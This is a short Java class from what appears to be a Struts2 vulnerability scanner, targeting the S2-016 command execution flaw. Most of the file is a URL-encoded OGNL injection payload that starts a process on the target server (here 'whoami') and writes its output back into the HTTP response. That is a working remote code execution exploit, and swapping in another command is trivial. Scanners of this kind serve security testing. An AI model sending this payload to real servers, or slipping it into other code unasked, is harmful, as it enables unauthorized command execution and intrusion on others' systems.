package com.mtx.xiatian.hacker.struts2Scan;

/**
 * 命令执行漏洞
 * http://struts.apache.org/docs/s2-016.html
 * @author xiatian,fucong
 *
 */
public class S2_016 extends CheckTools implements IStruts2Scan {

	private static String s2_016_POC= "redirect:${%23a%3d%28new%20java.lang.ProcessBuilder%28new%20java.lang.String[]{%27whoami%27}%29%29.start%28%29,%23b%3d%23a.getInputStream%28%29,%23c%3dnew%20java.io.InputStreamReader%28%23b%29,%23d%3dnew%20java.io.BufferedReader%28%23c%29,%23e%3dnew%20char[50000],%23d.read%28%23e%29,%23matt%3d%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29,%23matt.getWriter%28%29.println%28%23e%29,%23matt.getWriter%28%29.flush%28%29,%23matt.getWriter%28%29.close%28%29}";
	
	@Override
	public boolean doS2LeakScan(String target) {
		return doS2LeakScan(target, s2_016_POC);
	}

}

